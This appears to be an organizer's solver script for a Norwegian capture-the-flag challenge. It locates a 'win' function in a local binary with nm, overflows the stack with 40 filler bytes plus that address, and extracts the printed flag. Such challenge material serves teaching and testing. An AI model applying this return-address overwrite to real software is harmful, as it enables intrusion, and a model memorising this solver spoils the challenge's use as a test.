#!/usr/bin/env python3
"""Organizer solver for Retur til vaktbua."""

from __future__ import annotations

import re
import struct
import subprocess
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
BINARY = ROOT / "retur_vaktbua"
OFFSET = 40


def find_win(binary: Path) -> int:
    output = subprocess.check_output(["nm", "-n", str(binary)], text=True)
    for line in output.splitlines():
        if line.endswith(" T win"):
            return int(line.split()[0], 16)
    raise SystemExit("Fant ikke win-symbol")


def main() -> None:
    binary = (Path(sys.argv[1]) if len(sys.argv) > 1 else BINARY).resolve()
    win = find_win(binary)
    payload = b"A" * OFFSET + struct.pack("<Q", win) + b"\n"

    proc = subprocess.run(
        [str(binary)],
        input=payload,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )
    output = proc.stdout.decode(errors="replace")
    print(output)

    match = re.search(r"CTF\{[^}\s]+\}", output)
    if not match:
        raise SystemExit("Fant ikke flagg i output")

    print(f"FLAGG: {match.group(0)}")


if __name__ == "__main__":
    main()
